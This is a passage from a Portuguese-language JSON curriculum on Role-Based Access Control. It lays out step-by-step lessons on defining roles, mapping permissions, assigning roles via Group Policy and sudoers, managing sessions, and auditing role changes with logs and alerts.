                                  "verification": "Produzir uma tabela com funções e responsabilidades associadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Descrição do contexto organizacional",
                                    "Ferramenta de planilha como Google Sheets",
                                    "Papel e caneta para brainstorming"
                                  ],
                                  "tips": "Pergunte: 'Quem precisa fazer isso e por quê?' para evitar roles desnecessários.",
                                  "learningObjective": "Identificar funções reais que justificam roles distintos.",
                                  "commonMistakes": [
                                    "Criar roles muito granulares ou baseados em indivíduos em vez de funções."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir e nomear roles",
                                  "subSteps": [
                                    "Atribuir nomes descritivos e intuitivos para cada função identificada.",
                                    "Definir o escopo de cada role com base em responsabilidades.",
                                    "Estabelecer herança ou hierarquia inicial entre roles.",
                                    "Revisar nomes para clareza e evitar ambiguidades.",
                                    "Documentar definições em um glossário simples."
                                  ],
                                  "verification": "Lista de 5-8 roles definidos com descrições curtas.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Planilha de roles",
                                    "Templates de documentação RBAC"
                                  ],
                                  "tips": "Use nomes como 'Gerente de TI' em vez de 'João do TI' para generalidade.",
                                  "learningObjective": "Criar definições claras de roles alinhadas a funções.",
                                  "commonMistakes": [
                                    "Nomear roles de forma vaga ou não intuitiva, como 'Role1'."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Categorizar roles e atribuir permissões iniciais",
                                  "subSteps": [
                                    "Classificar roles em categorias como administrativo, operacional, usuário final.",
                                    "Listar permissões necessárias para cada categoria de role.",
                                    "Aplicar princípio de menor privilégio a cada role.",
                                    "Criar uma matriz role-permissão preliminar.",
                                    "Validar categorização com cenários de uso."
                                  ],
                                  "verification": "Matriz de categorização e permissões gerada.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "Ferramenta de tabela (Excel/Google Sheets)",
                                    "Lista de permissões do sistema"
                                  ],
                                  "tips": "Agrupe roles por departamento ou nível de acesso para facilitar gerenciamento.",
                                  "learningObjective": "Categorizar roles logicamente e associar permissões apropriadas.",
                                  "commonMistakes": [
                                    "Atribuir privilégios excessivos ou ignorar herança entre roles."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Validar e documentar a estrutura de roles",
                                  "subSteps": [
                                    "Simular atribuição de usuários a roles e testar conflitos.",
                                    "Revisar cobertura de todas funções identificadas.",
                                    "Ajustar categorizações baseadas em feedback simulado.",
                                    "Gerar diagrama visual de roles e categorias.",
                                    "Preparar política de roles para aprovação."
                                  ],
                                  "verification": "Documento final com diagrama e matriz validada.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Ferramenta de diagrama como Draw.io",
                                    "Documento Word/Google Docs"
                                  ],
                                  "tips": "Teste com 'e se?' para cenários de falha de segurança.",
                                  "learningObjective": "Garantir que roles sejam robustos, categorizados e documentados.",
                                  "commonMistakes": [
                                    "Pular validação, levando a lacunas de cobertura."
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma clínica médica: Defina role 'Médico' (permissões: editar prontuários, prescrever remédios, aprovar cirurgias); 'Enfermeiro' (ler/editar observações clínicas, administrar medicamentos); 'Recepção' (agendar consultas, visualizar dados básicos); 'Paciente' (ler próprios dados). Categorize como: Administrativo (Recepção), Clínico (Médico/Enfermeiro), Usuário (Paciente).",
                              "finalVerifications": [
                                "Lista completa de roles com nomes, descrições e categorias.",
                                "Matriz de permissões por role sem violações de menor privilégio.",
                                "Diagrama visual mostrando categorização e herança.",
                                "Cobertura de 100% das funções organizacionais identificadas.",
                                "Simulação de cenários sem atribuição direta de permissões a usuários.",
                                "Documento de política de roles pronto para implementação."
                              ],
                              "assessmentCriteria": [
                                "Precisão e clareza nas definições e categorizações de roles (90%+ alinhamento com funções).",
                                "Aplicação correta do princípio de menor privilégio em todas permissões.",
                                "Ausência de sobreposições excessivas ou lacunas em cobertura funcional.",
                                "Nomes e categorias intuitivos e escaláveis.",
                                "Documentação completa e profissional.",
                                "Validação bem-sucedida em simulações de uso real."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Empresas: Definição de cargos e responsabilidades organizacionais.",
                                "Desenvolvimento de Software: Implementação de RBAC em linguagens como Python ou Java.",
                                "Governança e Compliance: Alinhamento com normas como LGPD ou ISO 27001.",
                                "Gestão de Projetos: Mapeamento de papéis em equipes ágeis (ex: Scrum roles)."
                              ],
                              "realWorldApplication": "Em ambientes corporativos como bancos ou hospitais, RBAC com roles categorizados é usado em ferramentas como Active Directory, AWS IAM ou Keycloak para gerenciar acesso de milhares de usuários, reduzindo riscos de breaches ao evitar permissões diretas e facilitando auditorias de compliance."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.6.1.3",
                            "name": "Associar permissões a roles",
                            "description": "Mapear operações específicas (permissões, como ler, escrever ou executar arquivos) a roles, garantindo que acessos sejam concedidos indiretamente via funções.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Permissões e Roles em RBAC",
                                  "subSteps": [
                                    "Estude a definição de permissões como operações específicas (ex: read, write, execute).",
                                    "Revise o conceito de roles como agrupadores lógicos de permissões.",
                                    "Analise exemplos de como acessos são concedidos indiretamente via roles, não diretamente a usuários.",
                                    "Identifique a diferença entre permissões atômicas e sessões de permissões em RBAC.",
                                    "Crie um diagrama simples ilustrando users -> roles -> permissions."
                                  ],
                                  "verification": "Crie um glossário pessoal com definições corretas e diagrama validado por auto-revisão ou peer review.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação RBAC (NIST SP 800-53), diagramas em ferramentas como Draw.io ou papel e caneta.",
                                  "tips": "Use analogias como 'roles são como cargos em uma empresa, permissões são tarefas permitidas'.",
                                  "learningObjective": "Dominar terminologia e estrutura hierárquica de RBAC para basear associações.",
                                  "commonMistakes": "Confundir roles com usuários ou permissões com autenticação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar e Catalogar Permissões Específicas do Sistema",
                                  "subSteps": [
                                    "Liste todas as operações relevantes no sistema (ex: ler arquivo, executar script, modificar config).",
                                    "Classifique permissões por tipo (ex: CRUD: Create, Read, Update, Delete).",
                                    "Priorize permissões críticas baseadas em risco (alta para write/execute).",
                                    "Documente dependências entre permissões (ex: delete requer write).",
                                    "Crie uma tabela de permissões com colunas: Nome, Descrição, Risco."
                                  ],
                                  "verification": "Tabela completa com pelo menos 10 permissões catalogadas e classificadas corretamente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Planilha (Google Sheets/Excel), documentação do sistema operacional ou aplicação alvo.",
                                  "tips": "Comece com um subsistema pequeno, como gerenciamento de arquivos, para evitar sobrecarga.",
                                  "learningObjective": "Capacitar catalogação sistemática de permissões para mapeamento preciso.",
                                  "commonMistakes": "Ignorar permissões implícitas ou de baixo nível como listar diretórios."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir Roles e Associar Permissões",
                                  "subSteps": [
                                    "Defina roles baseados em funções organizacionais (ex: Admin, Editor, Viewer).",
                                    "Mapeie permissões à roles usando princípio de menor privilégio.",
                                    "Crie sessões de permissões para cada role (ex: Editor = {read, write}).",
                                    "Valide herança de roles se aplicável (ex: Editor herda de Viewer).",
                                    "Gere uma matriz de roles x permissões para visualização."
                                  ],
                                  "verification": "Matriz preenchida sem sobreposições desnecessárias ou lacunas críticas.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramenta de modelagem (Lucidchart, Visio), matriz em planilha.",
                                  "tips": "Aplique o princípio 'need-to-know': associe apenas o essencial por role.",
                                  "learningObjective": "Habilitar criação de associações seguras e escaláveis entre roles e permissões.",
                                  "commonMistakes": "Atribuir privilégios excessivos a roles amplos, violando least privilege."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar, Testar e Documentar a Associação",
                                  "subSteps": [
                                    "Configure roles e associações em um ambiente simulado (ex: Linux groups ou ferramenta RBAC como Keycloak).",
                                    "Teste acessos simulando usuários em diferentes roles.",
                                    "Registre falhas e ajuste associações.",
                                    "Documente a configuração final com justificativas.",
                                    "Audite para conformidade com políticas de segurança."
                                  ],
                                  "verification": "Testes passam para todos os cenários planejados; documentação revisada.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Ambiente virtual (VM com Linux), ferramentas RBAC (rbac-tools ou sudoers).",
                                  "tips": "Use contas de teste isoladas para evitar impactos reais.",
                                  "learningObjective": "Aplicar associações em prática e validar operacionalidade.",
                                  "commonMistakes": "Não testar cenários de negação de acesso ou herança incorreta."
                                }
                              ],
                              "practicalExample": "Em um servidor Linux com arquivos sensíveis: Crie role 'Analista' associado a permissões {read, list} em /dados/relatorios/; role 'Gerente' com {read, write, execute} no mesmo diretório. Usuário João (Analista) pode ler mas não editar, enquanto Maria (Gerente) pode modificar relatórios via scripts.",
                              "finalVerifications": [
                                "Todos os roles têm permissões definidas sem sobras ou faltas.",
                                "Testes confirmam que acessos são negados fora das associações.",
                                "Matriz de roles-permissões está completa e auditável.",
                                "Princípio de menor privilégio é respeitado em 100% dos roles.",
                                "Documentação inclui justificativas para cada associação.",
                                "Simulação com usuários reais valida indireção via roles."
                              ],
                              "assessmentCriteria": [
                                "Precisão: Associações mapeiam corretamente operações a roles (90%+ acurácia).",
                                "Completude: Todas as permissões relevantes catalogadas e associadas.",
                                "Segurança: Aplicação consistente de least privilege e no over-privileging.",
                                "Documentação: Matriz e justificativas claras e profissionais.",
                                "Testabilidade: Verificações finais executadas com resultados documentados.",
                                "Escalabilidade: Design permite adição de novos roles sem re-trabalho excessivo."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas: Configuração prática em OS como Linux/Windows.",
                                "Programação: Implementação de RBAC em código (ex: Python com libraries como pycasbin).",
                                "Gestão de TI: Alinhamento com frameworks como NIST e ISO 27001.",
                                "Análise de Riscos: Avaliação de impactos de permissões mal associadas."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou hospitais, associações RBAC garantem que enfermeiros acessem apenas registros de pacientes via role 'Enfermeiro', prevenindo vazamentos de dados e atendendo regulamentações como LGPD/GDPR, reduzindo riscos de insider threats."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.6.2",
                        "name": "Atribuição e Gerenciamento de Roles",
                        "description": "Processo de conceder roles a usuários de acordo com suas responsabilidades e gerenciar ativações em sessões, promovendo escalabilidade e auditoria em sistemas operacionais.",
                        "specificSkills": [
                          {
                            "id": "10.1.6.6.2.1",
                            "name": "Atribuir roles a usuários",
                            "description": "Executar a associação de um ou mais roles a um usuário baseado em sua função no sistema operacional, utilizando ferramentas como políticas de grupo no Windows ou sudoers no Linux.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos de RBAC e Identificar Funções de Usuários",
                                  "subSteps": [
                                    "Estude o princípio de Role-Based Access Control (RBAC) e seus componentes principais: usuários, roles e permissões.",
                                    "Analise cenários reais para mapear funções de usuários (ex: admin, usuário padrão, desenvolvedor).",
                                    "Liste roles necessários baseados em responsabilidades no sistema operacional.",
                                    "Crie um mapeamento simples: usuário -> função -> role.",
                                    "Revise documentação oficial de RBAC para Windows e Linux."
                                  ],
                                  "verification": "Crie um diagrama ou tabela mapeando 3 usuários fictícios a roles específicas e valide com um colega ou checklist.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Documentação Microsoft Active Directory, man sudoers Linux, diagramação tool como Draw.io",
                                  "tips": "Use o princípio de least privilege: atribua apenas o mínimo necessário.",
                                  "learningObjective": "Entender como RBAC associa roles a funções para controle de acesso seguro.",
                                  "commonMistakes": "Confundir roles com usuários individuais; ignorar herança de permissões."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Atribuir Roles no Windows Usando Políticas de Grupo",
                                  "subSteps": [
                                    "Acesse o Group Policy Management Console (GPMC) como administrador.",
                                    "Crie ou edite um Grupo de Segurança no Active Directory e adicione o usuário ao grupo (role).",
                                    "Configure políticas de grupo para aplicar permissões ao grupo (ex: acesso a pastas ou execução de apps).",
                                    "Aplique a política via gpupdate /force no cliente.",
                                    "Teste login do usuário para confirmar aplicação."
                                  ],
                                  "verification": "Execute 'gpresult /r' no usuário alvo e confirme que o grupo/role aparece nas políticas aplicadas.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "VM Windows Server com AD, VM Windows 10 cliente, acesso admin",
                                  "tips": "Sempre teste em ambiente de lab antes de produção para evitar lockouts.",
                                  "learningObjective": "Executar atribuição de roles via grupos no Windows de forma segura.",
                                  "commonMistakes": "Esquecer de propagar mudanças com gpupdate; adicionar usuário ao grupo errado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Atribuir Roles no Linux Usando Arquivo sudoers",
                                  "subSteps": [
                                    "Instale visudo e edite o arquivo /etc/sudoers com 'visudo'.",
                                    "Defina um grupo ou alias para o role (ex: %admins ALL=(ALL) /usr/bin/systemctl).",
                                    "Adicione o usuário ao grupo via usermod -aG grupo usuario.",
                                    "Configure comandos específicos permitidos para o role.",
                                    "Salve e valide sintaxe com 'visudo -c'."
                                  ],
                                  "verification": "Faça login como o usuário e execute 'sudo -l' para listar permissões atribuídas.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "VM Linux Ubuntu/CentOS, editor visudo, usuário teste",
                                  "tips": "Sempre use visudo para evitar erros de sintaxe que bloqueiam sudo.",
                                  "learningObjective": "Implementar RBAC no Linux via sudoers com granularidade de comandos.",
                                  "commonMistakes": "Editar sudoers diretamente sem visudo; permissões excessivas como ALL=(ALL)."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar, Testar e Auditar Atribuições de Roles",
                                  "subSteps": [
                                    "Execute testes de acesso: comandos permitidos funcionam, proibidos falham.",
                                    "Monitore logs: Event Viewer no Windows, /var/log/auth.log no Linux.",
                                    "Realize auditoria: liste membros de grupos e permissões atuais.",
                                    "Revogue uma role temporariamente e teste remoção.",
                                    "Documente o processo em um relatório simples."
                                  ],
                                  "verification": "Gere relatório confirmando que todos usuários têm apenas roles corretas sem sobras.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Ferramentas de log: Event Viewer, tail -f /var/log/auth.log, scripts de auditoria",
                                  "tips": "Automatize verificações com scripts para escalabilidade.",
                                  "learningObjective": "Garantir integridade e conformidade das atribuições de roles.",
                                  "commonMistakes": "Não testar falhas de acesso; ignorar logs de auditoria."
                                }
                              ],
                              "practicalExample": "Em uma empresa de TI, atribua o role 'Gerenciador de Servidores' ao usuário 'maria.ops' no Linux: edite sudoers para permitir 'sudo systemctl restart nginx' apenas, adicionando maria ao grupo 'server-admins'. No Windows, adicione ao grupo 'Domain Servers' via GPO para acesso remoto a servidores.",
                              "finalVerifications": [
                                "Usuário executa comandos permitidos sem senha ou com sudo correto.",
                                "Comandos não permitidos são bloqueados com erro de permissão.",
                                "Logs registram todas tentativas de acesso.",
                                "Listagem de grupos/roles do usuário corresponde ao esperado.",
                                "Revogação de role remove acessos imediatamente.",
                                "Sintaxe de configurações é válida sem erros."
                              ],
                              "assessmentCriteria": [
                                "Atribuição correta sem permissões excessivas (least privilege).",
                                "Uso adequado de ferramentas nativas (GPMC, visudo).",
                                "Testes abrangentes cobrindo sucessos e falhas.",
                                "Documentação clara do processo e mapeamento.",
                                "Aplicação em ambos OS sem erros críticos.",
                                "Tempo de execução dentro do estimado com eficiência."
                              ],
                              "crossCurricularConnections": [
                                "Administração de Sistemas Operacionais (Windows/Linux).",
                                "Gestão de Identidades e Acesso (IAM).",
                                "Auditoria e Conformidade (logs e relatórios).",
                                "Redes e Infraestrutura (controle em ambientes distribuídos)."
                              ],
                              "realWorldApplication": "Em organizações para implementar zero-trust, garantindo que desenvolvedores acessem apenas repositórios de código, admins gerenciem servidores sem root total, reduzindo riscos de breaches internas e atendendo regulamentações como LGPD ou NIST."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.6.6.2.2",
                            "name": "Gerenciar sessões de usuário em RBAC",
                            "description": "Entender e configurar sessões onde usuários ativam roles temporariamente, permitindo múltiplos roles por sessão sem comprometer a segurança.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos de Sessões e Roles Temporários em RBAC",
                                  "subSteps": [
                                    "Estude a definição de sessão em RBAC: um contexto temporário onde roles são ativados.",
                                    "Analise como sessões permitem ativação dinâmica de múltiplos roles sem alterar permissões permanentes.",
                                    "Revise princípios de segurança: isolamento de sessões, revogação e não repúdio.",
                                    "Compare sessões RBAC com sessões tradicionais de login (ex: stateless vs stateful).",
                                    "Identifique componentes chave: session ID, role bindings temporários e timers de expiração."
                                  ],
                                  "verification": "Resuma em um diagrama os fluxos de ativação e desativação de roles em uma sessão.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação RBAC (NIST SP 800-53 SC-07)",
                                    "Diagramas UML de sessões",
                                    "Vídeos tutoriais sobre RBAC sessions"
                                  ],
                                  "tips": "Use analogias como 'chaves de hotel' para roles temporários para fixar conceitos.",
                                  "learningObjective": "Explicar como sessões RBAC mantêm granularidade de acesso sem comprometer segurança.",
                                  "commonMistakes": [
                                    "Confundir roles permanentes com temporários",
                                    "Ignorar expiração de sessões",
                                    "Subestimar riscos de session hijacking"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar Sessões Básicas em um Ambiente RBAC",
                                  "subSteps": [
                                    "Instale um sistema RBAC simulado (ex: Linux com sudoers ou Docker com Keycloak).",
                                    "Crie usuários e roles básicos (ex: role 'admin' e 'user').",
                                    "Implemente autenticação inicial e inicialização de sessão vazia.",
                                    "Configure mecanismo de ativação de role na sessão (ex: comando 'su - role').",
                                    "Adicione logging de sessão para rastreamento."
                                  ],
                                  "verification": "Execute login e ative um role; verifique logs confirmando sessão ativa.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "VM Linux Ubuntu",
                                    "Keycloak ou FreeIPA instalado",
                                    "Editor de config (vim/nano)"
                                  ],
                                  "tips": "Teste em ambiente isolado (VM) para evitar impactos em produção.",
                                  "learningObjective": "Configurar autenticação e inicialização segura de sessões RBAC.",
                                  "commonMistakes": [
                                    "Permissões excessivas no setup inicial",
                                    "Falha em sanitizar inputs de role",
                                    "Esquecer de configurar timeouts"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerenciar Múltiplos Roles por Sessão com Segurança",
                                  "subSteps": [
                                    "Implemente ativação de múltiplos roles em uma única sessão (ex: stack ou set de roles).",
                                    "Configure regras de precedência e conflitos entre roles (ex: role mais restritivo prevalece).",
                                    "Adicione revogação seletiva de roles sem encerrar sessão.",
                                    "Integre timers de expiração por role.",
                                    "Teste cenários de overlap de permissões."
                                  ],
                                  "verification": "Ative 2+ roles, execute ações conflitantes e confirme isolamento de permissões.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Código fonte RBAC custom (Python/Flask ou Bash scripts)",
                                    "Ferramentas de debug (strace, auditd)"
                                  ],
                                  "tips": "Use assertions em código para validar estado de roles em runtime.",
                                  "learningObjective": "Gerenciar ativações dinâmicas de múltiplos roles mantendo princípio de menor privilégio.",
                                  "commonMistakes": [
                                    "Permitir escalada de privilégios via múltiplos roles",
                                    "Não validar bounds de roles por sessão",
                                    "Ignorar herança de roles"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Auditar, Revogar e Validar Sessões RBAC",
                                  "subSteps": [
                                    "Configure auditoria completa: logs de ativação/revogação com timestamps e user IDs.",
                                    "Implemente revogação forçada de sessão (ex: kill session por admin).",
                                    "Crie scripts de validação de integridade de sessão.",
                                    "Teste ataques simulados (session fixation, poisoning).",
                                    "Gere relatórios de conformidade."
                                  ],
                                  "verification": "Simule revogação e confirme perda de acesso; revise logs para evidências.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de log (ELK stack ou journalctl)",
                                    "Scripts de teste automatizados"
                                  ],
                                  "tips": "Automatize testes com ferramentas como Ansible para repetibilidade.",
                                  "learningObjective": "Implementar mecanismos de auditoria e revogação para conformidade e resposta a incidentes.",
                                  "commonMistakes": [
                                    "Logs insuficientes para forense",
                                    "Revogação incompleta deixando roles residuais",
                                    "Exposição de session IDs em logs"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Linux corporativo, um analista de suporte (role 'support') ativa temporariamente role 'dbadmin' para uma manutenção de 30min. Após, o role expira automaticamente, revertendo permissões, enquanto a sessão continua para tarefas normais. Logs auditam a ativação para compliance GDPR.",
                              "finalVerifications": [
                                "Usuário ativa múltiplos roles em sessão sem escalada indevida.",
                                "Sessão expira roles corretamente sem afetar outros.",
                                "Logs registram todas ativações/revogações com detalhes imutáveis.",
                                "Testes de segurança (ex: injection) falham em comprometer sessão.",
                                "Revogação manual/admin termina sessão instantaneamente.",
                                "Relatórios gerados confirmam conformidade com políticas RBAC."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de ativação dinâmica (sem erros de permissão).",
                                "Robustez contra abusos (100% detecção em testes simulados).",
                                "Eficiência de auditoria (logs completos e pesquisáveis).",
                                "Tempo de revogação < 5s em cenários reais.",
                                "Integração seamless com autenticação existente.",
                                "Documentação clara de fluxos de sessão."
                              ],
                              "crossCurricularConnections": [
                                "Autenticação e Autorização (OAuth/JWT para sessions stateful).",
                                "Auditoria e Compliance (SIEM tools como Splunk para RBAC logs).",
                                "Desenvolvimento Seguro (implementação em apps com Spring Security RBAC).",
                                "Redes e Sistemas (integração com LDAP/AD para roles distribuídos).",
                                "Gestão de Incidentes (resposta via revogação em IR processes)."
                              ],
                              "realWorldApplication": "Em bancos, gerentes ativam roles 'auditor' temporariamente para revisões financeiras, garantindo acesso mínimo e auditável, prevenindo insider threats conforme regulamentações como PCI-DSS."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.6.1.1"
                            ]
                          },
                          {
                            "id": "10.1.6.6.2.3",
                            "name": "Auditar atribuições de roles",
                            "description": "Implementar logs e revisões para monitorar mudanças em atribuições de roles, detectando violações potenciais em ambientes de segurança cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Sistema de Logging para Atribuições de Roles",
                                  "subSteps": [
                                    "Instalar e configurar ferramentas de auditoria como auditd no Linux ou Event Viewer no Windows.",
                                    "Definir regras de auditoria para arquivos críticos como /etc/group, /etc/sudoers ou Active Directory group memberships.",
                                    "Testar a captura inicial de logs simulando uma mudança de role.",
                                    "Integrar logs com um sistema centralizado como ELK Stack ou Splunk.",
                                    "Verificar permissões para que apenas admins possam alterar logs."
                                  ],
                                  "verification": "Execute uma mudança simulada de role e confirme que o evento é registrado nos logs com detalhes como usuário, timestamp e ação.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Servidor Linux/Windows com RBAC",
                                    "auditd ou Windows Audit Policy",
                                    "Documentação oficial de auditd"
                                  ],
                                  "tips": "Use regras específicas como '-w /etc/group -p wa' para watch writes e attributes em arquivos de roles.",
                                  "learningObjective": "Entender e implementar logging básico para rastrear modificações em atribuições de roles.",
                                  "commonMistakes": [
                                    "Não testar regras de audit imediatamente",
                                    "Esquecer de habilitar auditing em políticas de grupo",
                                    "Logs sobrecarregando disco sem rotação configurada"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Políticas e Regras de Auditoria Específicas",
                                  "subSteps": [
                                    "Mapear roles críticas (ex: admin, user) e eventos a auditar (add, remove, modify).",
                                    "Criar políticas de revisão: frequência (diária/semanal), responsáveis e critérios de violação.",
                                    "Configurar filtros para violações potenciais, como atribuição de admin a contas não aprovadas.",
                                    "Documentar políticas em um repositório central (ex: Git ou wiki).",
                                    "Revisar políticas com stakeholders para alinhamento com compliance."
                                  ],
                                  "verification": "Documente as políticas e simule uma violação para verificar se ela é flagged conforme regras.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Templates de políticas NIST SP 800-53",
                                    "Ferramentas de edição como VS Code",
                                    "Lista de roles do ambiente"
                                  ],
                                  "tips": "Priorize roles de alto privilégio e integre com frameworks como NIST SC-07.",
                                  "learningObjective": "Desenvolver políticas claras para auditoria de RBAC que suportem detecção de violações.",
                                  "commonMistakes": [
                                    "Políticas vagas sem critérios mensuráveis",
                                    "Ignorar roles herdadas ou nested groups",
                                    "Não envolver equipe de compliance"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Ferramentas de Revisão e Análise de Logs",
                                  "subSteps": [
                                    "Desenvolver ou usar scripts (Python/Bash) para parsear logs e listar mudanças recentes.",
                                    "Configurar dashboards em ferramentas como Kibana ou Grafana para visualização.",
                                    "Automatizar revisões periódicas com cron jobs ou scheduled tasks.",
                                    "Integrar com SIEM para correlação de eventos.",
                                    "Testar script com dados de log históricos."
                                  ],
                                  "verification": "Execute o script e confirme que ele gera um relatório preciso de mudanças nos últimos 7 dias.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Python com bibliotecas pandas/syslog",
                                    "Kibana ou Grafana",
                                    "Amostras de logs de auditd"
                                  ],
                                  "tips": "Use regex para parsear campos como uid, auid e sucesso/falha nos logs de audit.",
                                  "learningObjective": "Criar ferramentas automatizadas para revisão eficiente de logs de RBAC.",
                                  "commonMistakes": [
                                    "Scripts frágeis a mudanças de formato de log",
                                    "Falta de handling de grandes volumes de dados",
                                    "Não versionar scripts"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Alertas e Detecção de Violações",
                                  "subSteps": [
                                    "Definir thresholds para alertas (ex: >1 mudança de admin/dia).",
                                    "Implementar notificações via email/Slack usando tools como Logstash alerts ou custom scripts.",
                                    "Simular violações e verificar disparo de alertas.",
                                    "Configurar respostas automáticas para violações críticas (ex: revogar role).",
                                    "Testar falsos positivos e refinar regras."
                                  ],
                                  "verification": "Simule 3 violações e confirme que alertas são enviados com detalhes corretos em <5 minutos.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Logstash ou Prometheus Alertmanager",
                                    "Serviço de email/Slack webhook",
                                    "Scripts de simulação"
                                  ],
                                  "tips": "Comece com alertas manuais para tuning antes de automação.",
                                  "learningObjective": "Estabelecer monitoramento proativo para detecção em tempo real de anomalias em RBAC.",
                                  "commonMistakes": [
                                    "Muitos falsos positivos levando a alert fatigue",
                                    "Alertas sem contexto (quem, o quê, quando)",
                                    "Não escalar alertas críticos"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Realizar Auditoria Completa e Gerar Relatórios",
                                  "subSteps": [
                                    "Executar auditoria full: revisar logs de 30 dias, identificar padrões.",
                                    "Gerar relatório com métricas (total mudanças, violações detectadas, tendências).",
                                    "Recomendar remediações e atualizar políticas.",
                                    "Arquivar relatórios com assinatura digital para compliance.",
                                    "Agendar próxima auditoria."
                                  ],
                                  "verification": "Produza um relatório final que resuma achados e ações corretivas implementadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Templates de relatório em Markdown/PDF",
                                    "Ferramentas como Jupyter para análise",
                                    "Ferramentas de assinatura digital"
                                  ],
                                  "tips": "Use gráficos para visualizar tendências de mudanças de roles.",
                                  "learningObjective": "Conduzir auditorias end-to-end e documentar para melhoria contínua.",
                                  "commonMistakes": [
                                    "Relatórios genéricos sem dados quantitativos",
                                    "Ignorar tendências históricas",
                                    "Não fechar o loop com ações corretivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um servidor Ubuntu com RBAC via grupos, configure auditd para monitorar /etc/group. Crie um script Python que roda diariamente via cron, parseia ausearch logs para mudanças em 'admin', compara com lista aprovada de membros e envia Slack alert se detectar adição não autorizada de 'userX' ao grupo admin.",
                              "finalVerifications": [
                                "Logs capturam todas mudanças simuladas de roles com detalhes completos.",
                                "Script de revisão gera relatório preciso sem falsos negativos.",
                                "Alertas disparam corretamente para violações em testes.",
                                "Auditoria full identifica e relata anomalias históricas.",
                                "Políticas documentadas e alinhadas com padrões como NIST.",
                                "Sistema resiste a sobrecarga de logs em cenários de alto volume."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de logs (100% captura de eventos testados).",
                                "Eficiência das revisões (tempo de execução <5min para 1 semana de logs).",
                                "Qualidade dos alertas (zero falsos positivos em 10 testes).",
                                "Completude do relatório (inclui métricas, tendências e ações).",
                                "Conformidade com políticas (todas regras implementadas).",
                                "Escalabilidade (funciona com >10k eventos/dia)."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Dados: Parsing e visualização de logs com Python/Pandas.",
                                "Programação: Desenvolvimento de scripts de automação em Bash/Python.",
                                "Gestão de Compliance: Alinhamento com regulamentações como GDPR/SOX.",
                                "Redes e Sistemas: Integração com SIEM em ambientes distribuídos.",
                                "Ética e Governança: Princípios de least privilege em RBAC."
                              ],
                              "realWorldApplication": "Em empresas como bancos ou governos, auditoria de RBAC previne insider threats e escalada de privilégios, garantindo compliance com NIST 800-53, ISO 27001 e detecção precoce de breaches como o SolarWinds."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.6.6.2.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.6.6.3",
                        "name": "Hierarquias e Restrições no RBAC",
                        "description": "Extensões avançadas do RBAC, como herança de roles e princípios de separação de deveres (SoD), para prevenir conflitos e elevar privilégios de forma controlada.",
